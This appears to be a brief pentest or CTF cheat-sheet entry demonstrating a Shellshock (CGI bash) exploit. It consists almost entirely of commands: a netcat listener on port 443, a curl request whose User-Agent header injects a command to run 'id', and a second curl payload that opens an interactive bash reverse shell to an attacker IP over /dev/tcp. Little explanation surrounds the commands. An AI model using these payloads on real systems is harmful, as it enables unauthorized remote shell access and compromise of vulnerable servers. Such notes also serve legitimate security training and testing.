## Example

```
nc -lvnp 443                                                                                                                                                                                                  1 ⨯
listening on [any] 443 ...
```

Test:
```
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://$VICTIM_IP/cgi-bin/test.sh
```
This should show group permissions
e.g:
```
uid=1000(nullbr41n) gid=1000(nullbr41n) groups=1000(nullbr41n)
```


```
VICTIM_IP=xx.x.x.x
ATTACKER_IP=xxx.xx.x.xx
curl --user-agent "() { ignored;}; /bin/bash -i >& /dev/tcp/$ATTACKER_IP/443 0>&1" http://$VICTIM_IP/cgi-bin/test.sh
```
